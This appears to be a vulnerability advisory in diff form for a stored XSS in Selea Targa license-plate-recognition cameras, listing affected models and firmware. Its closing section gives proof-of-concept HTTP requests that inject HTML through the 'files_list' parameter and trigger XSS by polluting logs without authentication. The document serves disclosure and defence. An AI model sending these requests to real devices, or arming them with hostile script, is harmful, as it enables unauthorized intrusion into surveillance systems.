@@ -1,0 +1,81 @@
+# Exploit Title: Selea Targa IP OCR-ANPR Camera - 'files_list' Remote Stored XSS
+# Date: 07.11.2020
+# Exploit Author: LiquidWorm
+# Vendor Homepage: https://www.selea.com
+
+Selea Targa IP OCR-ANPR Camera Remote Stored XSS
+
+
+Vendor: Selea s.r.l.
+Product web page: https://www.selea.com
+Affected version: Model: iZero
+                         Targa 512
+                         Targa 504
+                         Targa Semplice
+                         Targa 704 TKM
+                         Targa 805
+                         Targa 710 INOX
+                         Targa 750
+                         Targa 704 ILB
+                  Firmware: BLD201113005214
+                            BLD201106163745
+                            BLD200304170901
+                            BLD200304170514
+                            BLD200303143345
+                            BLD191118145435
+                            BLD191021180140
+                            BLD191021180140
+                  CPS: 4.013(201105)
+                       3.100(200225)
+                       3.005(191206)
+                       3.005(191112)
+
+Summary: IP camera with optical character recognition (OCR) software for automatic
+number plate recognition (ANPR) also equipped with ADR system that enables it to read
+the Hazard Identification Number (HIN, also known as the Kemler Code) and UN number
+of any vehicle captured in free-flow mode. TARGA is fully accurate in reading number
+plates of vehicles travelling at high speed. Its varifocal, wide-angle lens makes
+this camera suitable for all installation conditions. Its built-in OCR software works
+as an automatic and independent system without the need of a computer, thus giving
+autonomy to the device even in the event of an interruption in the connection between
+the camera and the operations centre.
+
+Desc: The application suffers from a stored XSS through a POST request. The issue is
+triggered when input passed to the 'files_list' parameter is not properly sanitized
+before being returned to the user. This can be exploited to execute arbitrary HTML
+and script code in a user's browser session in context of an affected site.
+
+Tested on: GNU/Linux 3.10.53 (armv7l)
+           PHP/5.6.22
+           selea_httpd
+           HttpServer/0.1
+           SeleaCPSHttpServer/1.1
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2021-5614
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5614.php
+
+
+07.11.2020
+
+--
+
+
+Remote Stored XSS:
+------------------
+
+POST /cgi-bin/get_file.php HTTP/1.1
+Host: 192.168.1.17
+
+name=Test&files_list=<marquee><h3>t00t</h3></marquee>
+
+
+Unauthenticated Log Pollution Trigger XSS:
+------------------------------------------
+
+GET /get_log.php?type=system HTTP/1.1
+Host: 192.168.1.17
